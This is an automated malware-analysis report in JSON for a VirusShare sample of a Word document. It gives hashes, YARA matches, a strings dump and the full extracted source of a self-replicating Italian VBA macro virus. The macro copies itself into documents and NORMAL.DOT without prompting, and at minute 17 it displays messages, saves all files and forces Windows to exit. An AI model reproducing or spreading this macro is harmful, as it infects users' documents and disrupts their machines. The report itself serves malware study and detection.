{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"AutoClose\""
        ],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Chr": "May attempt to obfuscate specific str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str"
        },
        "macro": "\n\n\n\nPublic Sub MAIN()\n\n    Infezione\n\n    Effetti\n\nEnd Sub\n\n\n\nPrivate Sub Infezione()\nDim fileattuale$\nDim dataeoraatt$\nDim dataeorasalv$\nDim dlg As Object\nDim macrodot$\nDim normaldot$\nDim trovata$\nDim NumeroMacro\nDim i\nDim macro$\nDim libcopia1$\n\n'** Salva come modello\n'** Non rileva di essere in rete\n\n\n'* memorizza in fileattuale il nome del doc aperto\n'* continua se il doc \u00e8 nuovo e non ha ancora un nome\n    fileattuale$ = \"\"\n    On Error Resume Next\n    fileattuale$ = WordBasic.[FileName$]()\n\n'* calcola data e ora e minuto dell ultimo salvataggio\n    dataeoraatt$ = WordBasic.[Date$]() + \" \" + WordBasic.[Time$]()\n    dataeorasalv$ = \"\"\n    If fileattuale$ <> \"\" Then\n        WordBasic.FileSummaryInfo FileName:=fileattuale$\n            Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)\n            WordBasic.CurValues.FileSummaryInfo dlg\n        dataeorasalv$ = dlg.LastSavedDate\n    End If\n\n'* se il minuto dell ultimo salvataggio \u00e8 quello attuale\n'* allora termina per non entrare in loop\n'* termina anche se il documento \u00e8 nuovo e non ancora salvato\n'* o se \u00e8 un file senza datasalvataggio, tipo un txt (che non sovrascrive)\n    If dataeorasalv$ = dataeoraatt$ Or dataeorasalv$ = \"\" Then GoTo fine\n\n'* trova dove \u00e8 la macro\n    macrodot$ = WordBasic.[MacroFileName$](\"AutoClose\")\n\n'* trova path e disabilita la richiesta di salvataggio di normal\n    normaldot$ = UCase(WordBasic.[DefaultDir$](2) + \"\\NORMAL.DOT\")\n    WordBasic.ToolsOptionsSave GlobalDotPrompt:=0\n\n'* controlla se ci \u00e8 gi\u00e0 una autoclose in normal\n    trovata$ = \"false\"\n    NumeroMacro = WordBasic.CountMacros()\n    For i = 1 To NumeroMacro\n        macro$ = WordBasic.[MacroName$](i, 0)\n        If macro$ = \"AutoClose\" Then trovata$ = \"true\"\n    Next i\n\n'* copia la macro in fileattuale, salvandolo come modello, o in normal\n'* va effettuata una qola copia o si ha errore (vedi: libcopia$=\"true\")\n    libcopia1$ = \"false\"\n    If fileattuale$ <> \"\" And fileattuale$ <> normaldot$ And fileattuale$ <> macrodot$ Then\n        WordBasic.FileSaveAs Format:=1\n        WordBasic.Organizer Copy:=1, Source:=macrodot$, Destination:=fileattuale$, Name:=\"AutoClose\", Tab:=3\n        libcopia1$ = \"true\"\n    End If\n    If fileattuale$ <> \"\" And fileattuale$ <> normaldot$ And fileattuale$ = macrodot$ And libcopia1$ = \"false\" And trovata$ = \"false\" Then WordBasic.Organizer Copy:=1, Source:=fileattuale$, Destination:=normaldot$, Name:=\"AutoClose\", Tab:=3\n\n'*\n' non implementato perch\u00e8 sovrascrive una altra AutoClose in filedot\n' ogni tanto copia la macro in un altro modello\n'   min = Minute(Now())\n'   filedot$ = \"\"\n'   If min = 30 Or min = 45 Then filedot$ = Files$(DefaultDir$(2) + \"\\*.DOT\")\n'   If filedot$ <> \"\" And filedot$ <> normaldot$ And filedot$ <> macrodot$ Then 'Libreria .Copia, .Origine = macrodot$, .Destinazione = filedot$, .Nome = '\"AutoClose\", .Scheda = 3\n\n' Opzione non implementata perch\u00e8 distrugge il formato originale di filealtro$\n' Bisognava comunque ancora evitare la richiesta di conversione formato\n'   filealtro$ = \"\"\n'   If Time$() = \"10.10\" Then filealtro$ = Files$(\"*.doc\")\n'   If filealtro$ <> \"\" And filealtro$ <> fileattuale$ And filealtro$ <> 'normaldot$ And filealtro$ <> filedot$ Then\n'       FileApri .Nome = filealtro$\n'       FileSalvaConNome .Nome = filealtro$, .Formato = 1\n'       Libreria .Copia, .Origine = normaldot$, .Destinazione = filealtro$, '.Nome = \"AutoClose\", .Scheda = 3\n'       FileChiudi 1\n'   End If\n'*\n\nfine:\n\nEnd Sub\n\n\n\nPrivate Sub Effetti()\nDim min_\nDim x\nDim timer_\n    \n    min_ = WordBasic.Minute(WordBasic.Now())\n\n    If min_ = 17 Then\n\n    For x = 1 To 3\n        For timer_ = 1 To (1000 * x)\n        Next timer_\n    Next x\n    WordBasic.ToggleFull\n    WordBasic.Beep\nWordBasic.MsgBox \". . . . . . . . . . . . . . . . . . . . ROBERTA TI AMO ! . . . . . . . . . . . . . . . . . . . .\", \"\"\n\n    For x = 1 To 2\n        For timer_ = 1 To (1000 * x)\n        Next timer_\n    Next x\n    WordBasic.Beep\nWordBasic.MsgBox \"Questo computer non \u00e8 ben protetto contro i virus ...\" + Chr(10) + \"A presto !\", \"\", 48\n\n    WordBasic.ToggleFull\nsalvataggioRob:\n    Err.Number = 0\n    On Error GoTo -1: On Error GoTo salvataggioRob\n    WordBasic.FileSaveAll 0\n\n    For x = 1 To 2\n        For timer_ = 1 To (1000 * x)\n        Next timer_\n    Next x\n    WordBasic.Beep\nriprendi:\n    Err.Number = 0\n    On Error GoTo -1: On Error GoTo riprendi\n    WordBasic.ExitWindows\n\n    End If\n\nEnd Sub\n"
    },
    "filename": "VirusShare_1cb24f18ad972207e18f6719390f3e62",
    "filesize": 43008,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 5.0, Code page: 1252, Author: MACRO, Template: Normal, Last Saved By: MACRO, Revision Number: 1, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Thu Jan 13 17:40:00 2000, Last Saved Time/Date: Thu Jan 13 17:41:00 2000, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "1cb24f18ad972207e18f6719390f3e62",
        "sha1": "e6b0b476f8250fc2dc58d0464825cebf5970d9d1",
        "sha256": "4f5ff908fd60e9356a915d053985c2da95031268df2026b0c95609477659774c"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "/ =!",
            "bjbj\u064e",
            "hjAijA",
            "MACRO",
            "Normal",
            "MACRO",
            "Microsoft Word 8.0",
            "Title",
            "_PID_GUID",
            ".a_]",
            "pl^]",
            "PR^]",
            "pl^]",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            "xiva",
            "im filea",
            "ttuale$",
            "dataeo",
            "salv",
            "lg As O bject",
            "7ma@crodot",
            "!n ormal",
            "NumeroM",
            "libcopi",
            "'** S",
            "@a comodello",
            " Non r",
            " di essere i\tet",
            " memori",
            "{ il",
            "( doc apert,",
            "ntinua s",
            " nuo",
            "vo e",
            "n h a anc un\"",
            "On Erro r Res",
            "Word",
            "Basic.[F",
            "5A$]",
            "'* @calcol:ata!A",
            "e m)",
            "to AE ult0imo k",
            "ggi@3A",
            " + \"@",
            "TimeC",
            "\t6If\u0292 <> \"\" ThenD",
            "A5Summa$ryo E9:=",
            "Set d",
            "'DialoHgRe`d.",
            "(False@",
            " CurValues",
            "L;@ ",
            ".LastSavedM",
            "hC[d  qu-AX oTa`Zra ter",
            "a  QALentracZl8oopB",
            "Ohe{",
            "TJn@TdTa",
            "a{D[Ce`",
            "aF, t",
            "ipoA[txt ",
            "n@msovrasc+?$ O\u0148 Or ",
            "C GoTo G",
            "`' mv",
            "\\\"c,B",
            "pathedis`abilig",
            "richies",
            "ase(gI[DeDfanDir",
            ")h\\NORMAL.DOT\"P",
            "ToolsOpt",
            " s!I Glob",
            "alDotPro@mpt:=0dIc2o`?ol ",
            "Jciq@6gi@2",
            "\"fa`",
            "CounZt(saAeFiy",
            "i, 0",
            "trua",
            " \"\u06bb@8B  ",
            "l,c ndolo, o#",
            "`eBu",
            "T](qa",
            "biae",
            "e (@|i: ",
            "{$dA",
            "/Ta2OHx0",
            "Orga",
            "nizer Co",
            "py:=1, Source:=F",
            ", D0inaa)IX, a",
            ", Tab:=3",
            "B\\implem\\ Xa]ch T3=ly^ AUe.  Q",
            "ogni ta]0\\a",
            ")Me(Now()+'",
            "(%PA!",
            "1's$(8O($O*N",
            "'Libreri",
            "a .+ia, .OriginQ",
            "N1= '*,.S@mda",
            "c-ggf1vp",
            "`' BisP",
            "aPG`un ",
            "h0} M:h",
            "_vhers ",
            "QW\"7",
            "\"10.10S",
            "'Apri .?T",
            "Conb",
            ",< '",
            "Chiu",
            "O'*a|fp*:",
            "xin_xc",
            "#W9_`",
            "172=!",
            "(1000 * x$p",
            "Toggle0Full",
            "MsgBo`x \". ",
            " ROBERTA",
            " TI AMO !o",
            "`ZQ4",
            "ic.MsgBo",
            "x \"Quest",
            "o comput",
            "er non ",
            " ben pro",
            "lntro",
            " i virus",
            " ...\" + Chr(10)",
            "!\", ",
            "WordBa",
            "Toggle",
            "Full",
            "lvataggi oRob:",
            "*Er@r.Numb",
            "=D 0",
            "r GoTo -x1: ",
            "ileSaveA,ll",
            "Mx = 1 (2\tT",
            "timer_",
            "o00 * x)",
            "Next ",
            "<Beep",
            "ripren",
            "di8p",
            "0Exi",
            "tWindows",
            "End If",
            "** Salva come modello",
            "** Non rileva di essere in rete",
            "* memorizza in fileattuale il nome del doc aperto",
            "* continua se il doc  nuovo e non ha ancora un nome",
            "* calcola data e ora e minuto dell ultimo salvataggio",
            "* se il minuto dell ultimo salvataggio  quello attuale",
            "* allora termina per non entrare in loop",
            "* termina anche se il documento  nuovo e non ancora salvato",
            "* o se  un file senza datasalvataggio, tipo un txt (che non sovrascrive)",
            "* trova dove  la macro",
            "AutoClose",
            "* trova path e disabilita la richiesta di salvataggio di normal",
            "\\NORMAL.DOT",
            "* controlla se ci  gi una autoclose in normal",
            "false",
            "AutoClose",
            "true' ,",
            "* copia la macro in fileattuale, salvandolo come modello, o in normal",
            "* va effettuata una qola copia o si ha errore (vedi: libcopia$=\"true\")",
            "false",
            "AutoClose",
            "true' 4",
            "false",
            "false",
            "AutoClose",
            " non implementato perch sovrascrive una altra AutoClose in filedot",
            " ogni tanto copia la macro in un altro modello",
            "   min = Minute(Now())",
            "   filedot$ = \"\"",
            "   If min = 30 Or min = 45 Then filedot$ = Files$(DefaultDir$(2) + \"\\*.DOT\")",
            "   If filedot$ <> \"\" And filedot$ <> normaldot$ And filedot$ <> macrodot$ Then 'Libreria .Copia, .Origine = macrodot$, .Destinazione = filedot$, .Nome = '\"AutoClose\", .Scheda = 3",
            " Opzione non implementata perch distrugge il formato originale di filealtro$",
            " Bisognava comunque ancora evitare la richiesta di conversione formato",
            "   filealtro$ = \"\"",
            "   If Time$() = \"10.10\" Then filealtro$ = Files$(\"*.doc\")",
            "   If filealtro$ <> \"\" And filealtro$ <> fileattuale$ And filealtro$ <> 'normaldot$ And filealtro$ <> filedot$ Then",
            "       FileApri .Nome = filealtro$",
            "       FileSalvaConNome .Nome = filealtro$, .Formato = 1",
            "       Libreria .Copia, .Origine = normaldot$, .Destinazione = filealtro$, '.Nome = \"AutoClose\", .Scheda = 3",
            "       FileChiudi 1",
            "   End If",
            ". . . . . . . . . . . . . . . . . . . . ROBERTA TI AMO ! . . . . . . . . . . . . . . . . . . . .",
            "Questo computer non  ben protetto contro i virus ...",
            "A presto !",
            "Attribut",
            "e VB_Nam",
            "e = \"Aut",
            "oClose\"",
            "Public",
            " Sub MAI(N()",
            "Infezione",
            " Effetti",
            "8End",
            "3387e0e22",
            "4387e0e22",
            "HdD3)f\"",
            "Date$",
            "Wordk",
            "Win16~",
            "Win32",
            "Normal",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Office",
            "Module1b",
            "AutoClose",
            "MAIN,",
            "Infezione",
            "EffettiL",
            "fileattualehq",
            "dataeoraatt\"",
            "dataeorasalvgF",
            "dlg-",
            "macrodot<",
            "normaldot",
            "trovataS",
            "NumeroMacro",
            "macroc",
            "libcopia1",
            "WordBasic",
            "FileName$m",
            "Time$_X",
            "FileSummaryInfoY",
            "FileNamej",
            "DialogRecord",
            "CurValues\u0224",
            "LastSavedDate'",
            "fineo",
            "MacroFileName$J",
            "UCase5",
            "DefaultDir$l",
            "ToolsOptionsSave}",
            "GlobalDotPrompt?",
            "CountMacros",
            "MacroName$",
            "FileSaveAs",
            "Organizer",
            "Copy\u01bf",
            "SourceG",
            "Destination\u043b",
            "min_",
            "timer_",
            "Minuteam",
            "Now%",
            "ToggleFull2",
            "Beep",
            "MsgBoxR",
            "ChrK~",
            "salvataggioRobN",
            "Erro",
            "Number-",
            "FileSaveAll",
            "riprendi",
            "ExitWindowsc",
            "Documentj",
            "Normal",
            "stdo",
            "G{00020430-",
            "0046}#2",
            ".0#0#C:\\",
            "WINNT\\System32\\",
            "2.tlb#OL",
            "E Automa0tion",
            "MSFms>",
            "FA66",
            "94014-26",
            "E3-43B1-",
            "A33A-19218",
            ".TWD#Microsoft ",
            "` Objec",
            "t Library",
            "P32641",
            "7AA-D3AC",
            "-4CEE-90",
            "05-CCF11913FC22",
            "DOCUME~1\\ADMINI",
            "@LOCALS",
            "emp\\VBE\\\tE-EXg-.E",
            "}Of(fic",
            "}Y2DF",
            "8D04C-5B",
            "F@W01B-BDE5",
            "97\\C",
            ",O97.DLLY",
            " 8.0Y",
            "ThisDocu ment",
            "o@$e",
            "-)R!@",
            "ThisDocument",
            "AutoClose",
            "ID=\"{445765A7-1CBA-46AC-85FF-B6B186F7264E}\"",
            "Document=ThisDocument/&H00000000",
            "Module=AutoClose",
            "Name=\"Normal\"",
            "HelpContextID=\"0\"",
            "CMG=\"66649E3A62C6CCCACCCACCCACCCA\"",
            "DPB=\"CCCE34A0FC07FD07FD07\"",
            "GC=\"3230CA4E314F314FCE\"",
            "[Host Extender Info]",
            "&H00000001={P",
            "3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8",
            " PAGE ",
            "Attention:",
            "ATTN:",
            " AUTHOR ",
            "\tPage ",
            " PAGE ",
            " DATE ",
            "Best regards,",
            "Best wishes,",
            "CERTIFIED MAIL",
            "CONFIDENTIAL",
            "Confidential\tPage ",
            " PAGE ",
            " DATE ",
            "Cordially,",
            "Created by ",
            " AUTHOR ",
            "Created on ",
            " CREATEDATE ",
            "Dear Mom and Dad,",
            "Dear Sir or Madam:",
            " FILENAME ",
            " FILENAME \\p ",
            "In reply to:",
            "Ladies and Gentlemen:",
            "Last printed ",
            " PRINTDATE ",
            "Last saved by ",
            " LASTSAVEDBY ",
            "Love,",
            "Page ",
            " PAGE ",
            " of ",
            " NUMPAGES ",
            "PERSONAL",
            "Reference:",
            "Regards,",
            "REGISTERED MAIL",
            "Respectfully yours,",
            "Respectfully,",
            "Sincerely yours,",
            "Sincerely,",
            "SPECIAL DELIVERY",
            "Subject:",
            "Take care,",
            "Thank you,",
            "Thanks,",
            "To Whom It May Concern:",
            "VIA AIRMAIL",
            "VIA FACSIMILE",
            "VIA OVERNIGHT MAIL",
            "Yours truly,",
            "/ =!"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.319249",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
